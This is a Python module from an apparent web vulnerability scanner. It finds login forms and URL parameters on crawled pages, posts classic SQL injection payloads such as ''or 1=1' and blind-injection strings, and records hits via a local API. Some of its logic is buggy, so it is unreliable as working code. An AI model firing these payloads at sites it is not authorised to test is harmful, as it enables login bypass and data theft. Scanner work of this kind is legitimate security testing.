__version__ = "0.1"
__copyright__ = "CopyRight (C) 2015 by Jonathan Castro"
__license__ = "Proprietary"
__author__ = "Jonathan Castro"
__author_email__ = "Jonathan Castro, jonathancastrogonzalez at gmail dot com"

import json
import requests
import urllib.parse
from threading import Thread
from bs4 import BeautifulSoup

from App.core.url import URL
from App.core.url_list import URLlist
from App.core.db_adapter import DBAdapter

# For normal injection; search for login forms, try and if the login form is still there, that injection didn't work.

api = "http://localhost:3000/saveresult"

class SQLInjection(object):
    def __init__(self, url_list, process, user):
        self.process = process
        self.user = user

        if url_list is None:
            self.url_list = URLlist()
        else:
            self.url_list = url_list

        # http://stackoverflow.com/questions/9626535/get-domain-name-from-url
        # self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))

        self.input_data = [
            ['admin\'--', '123456789'],
            ['\' or 1=1', '123456789'],
            ['admin', '\'or \'1\'=\'1']
        ]

        self.blind_param_data = [
            'A%\'--',
            'A%\' and 1=1--',
            'A%\' and 1=2--'
        ]

        # self.serialized_param_data = []

        self.sql_errors = {
            'MySQL': 'error in your SQL syntax'
        }

    def search_injections(self):
        while True:
            url = self.url_list.get_url()
            if url is None or type(url) is not URL:
                break
            self.__sign_in_attempt(url)
            self.__blind_sqli(url)
            # self.__serialized_sqli(url)

    def __sign_in_attempt(self, url):
        web = url.get_content()
        forms = web('form')
        for form in forms:
            action = form.get("action")
            inputs = form('input')
            data = []
            input_text_counter = 0
            input_pass_counter = 0
            for i in inputs:  # If there is a form with only a text and a password input then it's a logging in form.
                t = i.get("type")
                if t == "text":
                    input_text_counter += 1
                elif t == "password":
                    input_pass_counter += 1
                data.append(i.get("name"))

                if input_text_counter > 2 or input_pass_counter > 2:
                    break

            if input_text_counter == 1 and input_pass_counter == 1:  # Form found.
                for i in self.input_data:  # Attempting signing in with injection examples.
                    d = {
                        data[0]: i[0],
                        data[1]: i[1]
                    }
                    r = requests.post(action, data=urllib.parse.urlencode(d))
                    response = r.text
                    if action not in response:  # If the logging form doesn't exists, the attempt is a success.
                        self.__save_results(url, 1)
                        return True  # It is not necessary to keep going, we found an sql injection.
        return False

    def __blind_sqli(self, url):
        params = self.__get_parameters(url.get_url())
        domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url.get_url()))
        for x, y in params:
            for p in self.blind_param_data:
                data = {
                    x: p
                }
                r = requests.post(domain, data=urllib.parse.urlencode(data))
                response = r.text
                for t, e in self.sql_errors:
                    if e in response.lower():
                        self.__save_results(url, 2)
                        return True
        return False

    def __serialized_sqli(self, url):
        # params = self.__get_parameters(url)
        # self.__save_results(url, 3)
        return False

    def __get_parameters(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        return params

    def __save_results(self, web, v_type):
        db = DBAdapter()
        db.vulnerability_found(self.process, web, v_type)
        db.close_connection()

        data = {
            "PROCESS": self.process,
            "WEB": web,
            "VULNERABILITY": v_type,
            "USER": self.user
        }
        t = Thread(requests.post(api, data=json.dumps(data)))
        t.start()
